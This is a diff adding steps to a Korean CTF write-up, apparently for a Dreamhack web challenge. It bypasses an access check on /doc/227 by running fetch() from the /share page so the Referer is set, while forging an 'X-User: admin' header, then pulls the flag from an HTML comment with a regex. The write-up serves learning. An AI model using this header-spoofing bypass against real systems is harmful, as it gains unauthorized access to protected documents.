@@ -121,3 +121,81 @@ confidential 문서 발견 -> 타겟 선정
 
 --- 
 
+### 3-2. 직접 접근 실패
+
+GET /doc/227  
+
+결과:  
+Access Denied  
+- Referer 조건 미충족
+
+---
+
+### 3-3. 해결 아이디어 
+
+핵심 아이디어:  
+**브라우저가 자동으로 Referer 를 붙이게 만든다.**  
+
+---
+
+### 3-4. Referer 우회 방법
+
+브라우저에서 /share 페이지를 열고  
+DevTools 콘솔에서 실행하면 자동으로 Referer가 /share로 설정된다.  
+
+```python
+fetch('/doc/227', {
+headers: {
+'X-User': 'admin'
+}
+})
+```
+
+---
+
+### 3-5. 실행 흐름
+
+이 요청은 실제로 다음과 같이 동작한다.  
+
+```python
+GET /doc/227
+Referer: http://127.0.0.1:3333/share
+X-User: admin
+```
+
+두 조건 모두 만족  
+
+--- 
+
+### 3-6. 결과
+
+서버가 문서를 반환하고  
+HTML 내부에 다음이 포함된다.  
+
+```python
+<!-- FLAG: DH{...} -->
+```
+
+---
+
+### 3-7. 플래그 추출
+
+정규식을 이용해서 추출한다. 
+
+```python
+const m = txt.match(/DH\{[\s\S]*?\}/);
+```
+
+FLAG만 추출 가능  
+
+---
+
+
+
+
+
+
+
+
+
+
